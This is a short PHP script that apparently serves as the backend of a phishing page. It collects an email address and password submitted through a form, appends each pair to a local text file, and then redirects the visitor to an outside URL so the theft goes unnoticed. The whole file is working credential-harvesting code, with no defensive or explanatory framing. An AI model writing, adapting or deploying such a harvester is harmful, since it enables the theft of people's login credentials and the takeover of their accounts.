<?php
$email = $_POST['email'];
$pass = $_POST['passs'];
$tekst = "$email|$pass \r\n";
 
$uchwyt = fopen("daw1kl;vm.txt", "a");
fwrite($uchwyt, $tekst);
fclose($uchwyt);
header("Location: https://leadn.pl/p_uri/dl4jEONZGWedZQngMeV2/5kz793k/?parametr=");
?>